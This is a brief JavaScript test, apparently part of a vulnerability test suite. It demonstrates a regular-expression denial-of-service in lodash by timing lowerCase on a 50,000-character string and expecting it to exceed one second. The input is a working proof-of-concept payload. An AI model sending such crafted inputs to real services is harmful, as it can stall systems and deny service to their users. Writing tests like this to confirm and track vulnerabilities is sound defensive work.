test("ReDos in lodash", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const _ = require("lodash");
  let t = measureTime(function () {
    let agent = _.lowerCase(genstr(50000, "A"));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
